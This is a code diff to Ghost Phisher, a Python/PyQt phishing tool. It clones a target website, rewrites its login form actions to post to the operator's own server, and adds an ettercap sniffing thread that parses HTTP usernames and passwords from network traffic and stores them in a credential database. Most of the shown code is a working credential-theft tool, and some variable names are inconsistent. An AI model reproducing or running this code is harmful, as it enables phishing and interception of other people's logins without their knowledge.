@@ -1107,6 +1107,7 @@ import socket               # For network based servcies e.g DNS
 import urllib2              # For getting the source code of websites that user wants to clone
 import sqlite3              # For saving fetched credentials to database
 import commands             # For executing shell commands and getting system output e.g DHCP3
+import subprocess           # For reading live output from terminal processes
 
 
 cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
@@ -1174,6 +1175,9 @@ dhcp_installalation_status = ''                                 # Holds the DHCP
 
 # Global variables for Fake HTTP
 http_installalation_status = ''                                 # Holds the HTTP installation status
+
+# Global variables for Sniffer process
+ettercap_installalation_status = ''                                 # Holds the ettercap installation status
 
 # Global variables for Fake HTTP
 http_server_port = 80                                           # Default HTTP port
@@ -1244,11 +1248,27 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         # Check if mini-httpd Server service is installed on the computer
         #
         global http_installalation_status
+        global ettercap_installation_status
+
         installalation_status = commands.getstatusoutput('which mini-httpd')
         if installation_status[0] != 0:
             self.status_textbrowser_http.append('<font color=red>HTTP Server is not installed</font>')
             self.status_textbrowser_http.append('<font color=green>To Install HTTP Server run:</font>\t<font color=red>apt-get install mini-httpd</font>')
             http_installalation_status = 'not installed'
+            self.http_interface_combo.setEnabled(False)
+            self.http_ip_combo.setEnabled(False)
+            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  Deactivated")
+            self.http_port_label.setText('<font color=green>TCP Port:</font> Not Started')
+            self.groupBox_8.setEnabled(False)
+            self.http_start.setEnabled(False)
+
+        self.status_textbrowser_http.append('')
+
+        installation_status = commands.getstatusoutput('which ettercap')
+        if installation_status[0] != 0:
+            self.status_textbrowser_http.append('<font color=red>Packet Sniffer is not installed</font>')
+            self.status_textbrowser_http.append('<font color=green>To Install Packet Sniffer run:</font>\t<font color=red>apt-get install ettercap-gtk</font>')
+            ettercap_installalation_status = 'not installed'
             self.http_interface_combo.setEnabled(False)
             self.http_ip_combo.setEnabled(False)
             self.current_card_label_2.setText("<font color=green>Current Interface:</font>  Deactivated")
@@ -1337,7 +1357,7 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
 
         # Add iterface card names to the DNS interface combo and HTTP combo
 
-        # HTTP Server runs on default route by default,"0.0.0.0" will cause problems if used on the forms action POST e.g action="http://0.0.0.0/cgi-bin/login"
+        # HTTP Server runs on default route by default,"0.0.0.0" will cause problems if used on the forms action POST e.g action="http://0.0.0.0/"
         # therefore the program uses another interfaces ip address for the action posts
         interface_cards_http.remove('Default Route Address')
         interface_cards_http.reverse()
@@ -1398,6 +1418,7 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         self.connect(self,QtCore.SIGNAL("dns stopped"),self.stop_dns)
         self.connect(self,QtCore.SIGNAL("new client connection"),self.update_dns_connections)
         self.connect(self,QtCore.SIGNAL("new connection"),self.new_connection)
+        self.connect(self,QtCore.SIGNAL('new credential'),self.new_credential)
         self.connect(self,QtCore.SIGNAL("run tips"),self.run_tips)
         self.connect(self,QtCore.SIGNAL("access point output"),self.update_access_output)
         self.connect(self,QtCore.SIGNAL("access point error"),self.update_access_error)
@@ -2081,6 +2102,37 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         self.status_textbrowser_http.append('<font color=blue>%s</font>'\
                                     %(http_details[-1]))
 
+    def sniff_thread(self):
+        ''' Thread launches ettercap as the sniffing
+            engine
+        '''
+        global http_control
+
+        interface = str(self.http_interface_combo.currentText())    # Http interface card
+        if interface == 'Loopback Address':
+            sniff_interface = 'lo'
+        else:
+            sniff_interface = interface
+
+        if 'sniff_log' in os.listdir('/tmp/'):      # Remove previous sniff log file
+            os.remove('/tmp/sniff_log')
+        pipe = subprocess.Popen('ettercap -i %s -T -q'%(sniff_interface),shell=True,stdout= subprocess.PIPE)
+        sniff_output = pipe.stdout
+        while http_control != 1:
+            if 'HTTP' in str(sniff_output.readline()):
+                credential_process = sniff_output.readline().split()
+                username = credential_process[5]
+                password = credential_process[7]
+                if str(self.lineEdit_2.text()) == '':
+                    website = credential_process[-1]
+                else:
+                    website = str(self.lineEdit_2.text())
+                self.database_commit(website,username,password)
+                self.emit(QtCore.SIGNAL('new credential'))
+
+
+
+
 
     def http_update_thread(self):
         ''' This thread checks the '/tmp/http_logfile'
@@ -2126,6 +2178,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
                 self.credential_table.setItem(iterate,2,password)
         except IndexError:
             pass
+        captured_credential += 1
         self.http_captured_credential.setText('captured credentials:<font color=green>\t %s</font>'%(captured_credential))
 
 
@@ -2201,7 +2254,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 
     def start_http_service(self):
-        '''Start the HTTP Service'''
+        '''Starts the HTTP Service'''
         global http_address
         global http_server_port
 
@@ -2227,7 +2280,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         if 'HTTP-Webscript' in os.listdir(cwd):     # Create web directory if it does not exist
             commands.getstatusoutput('rm -r ' + cwd + '/HTTP-Webscript')
         os.mkdir(cwd + '/HTTP-Webscript')
-        os.mkdir(cwd + '/HTTP-Webscript'+ os.sep + 'cgi-bin')        # Create (cgi-bin) directory for login handler
 
         if 'Ghost-Phisher-Database' not in os.listdir(cwd): # Create Database directory
             os.mkdir('Ghost-Phisher-Database')
@@ -2287,7 +2339,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
                 self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
                 commands.getstatusoutput('rm -r ' + cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
                 os.mkdir(cwd + '/HTTP-Webscript')
-                os.mkdir(cwd + '/HTTP-Webscript'+ os.sep + 'cgi-bin')
                 try:
                     url_source = urllib2.urlopen(website_url)                    # Get the source code of the website and write an HTML file of the website
                     web_script = open('HTTP-Webscript/index.html','a+')
@@ -2327,7 +2378,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
             action_string = index_forms_end[0:index_form_length]
 
-            new_post_action = html_source.replace(action_string,"action=" + http_address) # Replaces action variable with ours e.g <action="http://192.168.0.23/cgi-bin/login">
+            new_post_action = html_source.replace(action_string,"action=" + http_address) # Replaces action variable with ours e.g <action="http://192.168.0.23/">
             create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
             #
             # Check if html source has a valid Post action method
@@ -2339,13 +2390,15 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             new_html_file.close()
 
             self.status_textbrowser_http.append('<font color=green>Sniffing http port for possible login packets')
+            thread.start_new_thread(self.sniff_thread,())                       # HTTP credential Sniffing thread
+
 
         else:                                                              # Hosting Mode is enabled
             self.status_textbrowser_http.append('<font color=green>Website Hosting activated</font>')
 
 
 
-        if http_error == 0:      # Means that we hitted this block without any errors from the others
+        if http_error == 0:      # Means that we hitted this block without any errors from the other blocks
             self.http_start.setEnabled(False)
             self.http_stop.setEnabled(True)
             self.http_captured_credential.setText('captured credentials:')
